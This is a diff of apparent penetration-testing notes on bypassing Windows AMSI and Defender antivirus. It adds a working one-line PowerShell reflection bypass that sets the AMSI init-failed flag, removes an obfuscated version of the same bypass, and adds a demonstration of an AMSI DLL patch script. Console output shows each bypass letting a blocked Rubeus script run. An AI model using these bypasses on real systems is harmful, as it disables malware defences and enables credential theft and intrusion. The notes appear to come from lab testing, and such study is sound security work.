@@ -5,8 +5,10 @@ Living off the land and fileless techniques
 INDEX
 ===============================
 I.   Reminder & Definitions
-II.  Examples of manual AMSI and AV bypass by forcing the AMSI initialization to fail in a PowerShell session
-III. Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
+II.  Examples of AMSI and AV bypass by forcing the AMSI initialization to fail in a PowerShell session
+III. Example of AMSI and AV bypass by patching the AMSI DLL
+IV.  Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
+
 
 ================================================================================================================================================
 I. Reminder & Definitions
@@ -107,10 +109,10 @@ Windows Security features and Microsoft security products
   
   
 ================================================================================================================================================
-II.  Examples of manual AMSI and AV bypass by forcing the AMSI initialization to fail in a PowerShell session
+II.  Examples of AMSI and AV bypass by forcing the AMSI initialization to fail in a PowerShell session
 ================================================================================================================================================
 
-Test 1 - Manual AMSI bypass as a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
+Test 1 - AMSI bypass as a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 Windows PowerShell
@@ -186,7 +188,7 @@ AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\auditor\AppData\Local\Mic
 PS C:\temp>
 
 
-Test 2 - Manual AMSI bypass as a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
+Test 2 - AMSI bypass as a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 PS C:\> Enter-PSSession -Computername server02.Security-Test-Lab.Local -Credential server02\administrator
@@ -202,15 +204,10 @@ This script contains malicious content and has been blocked by your antivirus so
     + CategoryInfo          : ParserError: (:) [], ParseException
     + FullyQualifiedErrorId : ScriptContainedMaliciousContent
 
-=> Note: Let's disable it.
+=> Now let's disable the AMSI and re-execute 'Invoke-Rubeus'.
 
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $Hxl=$null;
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $xqhoooo="$([cHAr](83*54/54)+[CHAR]([bYTe]0x79)+[chaR]([BytE]0x73)+[cHAR]([ByTE]0x74)+[chAR]([BYte]0x65)+[chAr]([BYTE]0x6d)).$(('Mänäg'+'ement').NORmAlize([ChAr](13+57)+[cHAr]([BytE]0x6f)+[CHAR](40+74)+[cHaR](92+17)+[CHAr](68+27-27)) -replace [ChAr]([BYte]0x5c)+[CHar](112)+[chAR]([byte]0x7b)+[chAr](77*64/64)+[ChaR](110)+[char](125*63/63)).$(('Autóm'+'âtíon').nOrmALIZE([char]([BYtE]0x46)+[CHAr]([BYtE]0x6f)+[ChaR](114+1-1)+[ChaR]([ByTe]0x6d)+[chaR](68)) -replace [cHar]([ByTE]0x5c)+[cHAR]([bYTe]0x70)+[cHAR]([byTe]0x7b)+[cHAR]([byte]0x4d)+[CHar](110+94-94)+[cHAR]([BYtE]0x7d)).$([chAR]([bYTE]0x41)+[CHAR]([byTE]0x6d)+[ChAR]([ByTE]0x73)+[chaR](105+6-6)+[ChaR](85+23-23)+[cHAR](116*86/86)+[cHar](105)+[cHar]([BYtE]0x6c)+[cHAr](115))";
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $wpkfsoadsfehqpe="+[cHAR]([bytE]0x72)+[ChAr](121)+[chAR]([bYtE]0x79)+[cHar](97+3)+[cHar](121+41-41)+[cHAr]([bYte]0x6f)+[cHar]([BYTe]0x66)+[chAr](107+87-87)+[chAr]([BYTE]0x69)";
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> [Threading.Thread]::Sleep(286);
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> [Ref].Assembly.GetType($xqhoooo).GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR](105+75-75)+[CHar]([ByTe]0x49)+[chAr]([bytE]0x6e)+[CHar](37+68)+[cHAr](116+2-2)+[Char](70+37-37)+[char](97)+[chAR]([BYTE]0x69)+[chaR](93+15)+[CHAr]([byte]0x65)+[char](100)),"NonPublic,Static").SetValue($Hxl,$true);
-[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  . .\Invoke-Rubeus.ps1
 [server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  Invoke-Rubeus
    ______        _
@@ -223,11 +220,44 @@ This script contains malicious content and has been blocked by your antivirus so
   v1.6.4
 <SNIP>
 
-=> It is working.
+
+================================================================================================================================================
+III. Example of AMSI and AV bypass by patching the AMSI DLL
+================================================================================================================================================
+
+=> Source: https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998
+
+
+C:\Users\Auditor\Desktop>powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Auditor\Desktop> amsiscanbuffer
+At line:1 char:1
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+
+PS C:\Users\Auditor\Desktop> & '.\Invoke-AM$1-patch.ps1'
+True
+
+PS C:\Users\Auditor\Desktop> amsiscanbuffer
+amsiscanbuffer : The term 'amsiscanbuffer' is not recognized as the name of a cmdlet,function, script file, or operable program. 
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (amsiscanbuffer:String) [], CommandNotFoundEx
+   ception
+    + FullyQualifiedErrorId : CommandNotFoundException
 
 
 ================================================================================================================================================
-III. Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
+IV. Examples of AMSI and AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
 ================================================================================================================================================
 
 Test 1 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 2016 server with Defender (AV) enabled and up-to-date
@@ -450,7 +480,7 @@ Affected items:
 
 
 ===================================================================================================================================================
-IV. Example of Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
+V. Example of Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
 ===================================================================================================================================================
 
 Note:  Just for testing purposes, I installed the old and basic AV 'Microsoft Security Essentials' in compatibility mode on a Windows server 2012 R2.
